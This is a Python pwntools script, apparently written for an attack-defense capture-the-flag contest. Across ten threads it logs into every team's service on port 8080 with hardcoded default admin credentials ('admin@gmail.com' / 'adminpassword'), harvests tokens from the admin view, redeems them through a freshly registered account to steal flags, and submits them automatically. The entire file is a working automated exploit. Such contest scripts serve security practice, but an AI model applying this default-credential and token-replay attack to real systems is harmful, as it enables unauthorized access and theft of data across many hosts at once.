from pwn import *
from utilities import extract_flag, submit_flag
import json
import threading

port = 8080

def random_string(l):
    return ''.join(random.choice(string.ascii_letters) for i in range(l))


def register(username, email, password, host):
    r = remote(host, port, level='error')


    r.sendline('1')

    print(r.recvuntil('Username: ').decode())

    r.sendline(username)

    print(r.recvuntil('Email: ').decode())

    r.sendline(email)

    print(r.recvuntil('Password:').decode())
    r.sendline(password)

    r.close()

def admin_stuff(host):
    r = remote(host, port, level='error')

    print('\n\n DOING ADMIN STUFF \n\n')

    print(r.recvuntil('Your choice(1-2): ').decode())
    r.sendline('2')

    print(r.recvuntil('Email: ').decode())

    r.sendline('admin@gmail.com')

    print(r.recvuntil('Password: ').decode())
    r.sendline('adminpassword')

    x = r.recvall().decode().strip().split('\n')[2:]
    return x

def exploit(email, password, token, host):
    r = remote(host, port, level='error')

    print('\n\n DOING EXPLOIT \n\n')


    r.recvuntil('Your choice(1-2): ').decode()
    r.sendline('2')

    r.recvuntil('Email: ').decode()

    r.sendline(email)

    r.recvuntil('Password: ').decode()
    r.sendline(password)


    r.recvuntil('Your choice(1-3): ').decode()
    r.sendline('2')

    r.sendline(token)
    text = r.recvall().decode()

    flags = extract_flag(text)
    r.close()

    print(f'GOT FLAG {flags[0]}\n\n\n')

    print(host)

    return flags

teams = json.load(open('teamlist.json'))

used_tokens = {}

def exploit_team():
    while True:
        if len(teams) == 0:
            return
        else:
            team = teams.pop()
        try:
            host = team['ip']

            username = random_string(10)
            email = username + '@gmail.com'
            password = random_string(10)
            register(username, email, password, host)
            tokens = admin_stuff(host)

            if not used_tokens.get(team['ip']):
                used_tokens[team['ip']] = {}

            for token in tokens:
                if token not in used_tokens[team['ip']]:
                    used_tokens[team['ip']][token] = exploit(email, password, token, host)[0]

            print(f'\n\n\n\n\n\nSUBMITTING FOR TEAM {team}\n\n\n\n\n\n')

            submit_flag(list(used_tokens[team['ip']].values()))


        except Exception:
            print(f'Failed for {team["name"]}')
    

jobs = []

for i in range(10):
    x = threading.Thread(target=exploit_team)
    jobs.append(x)
    x.start()

for job in jobs:
    job.join()

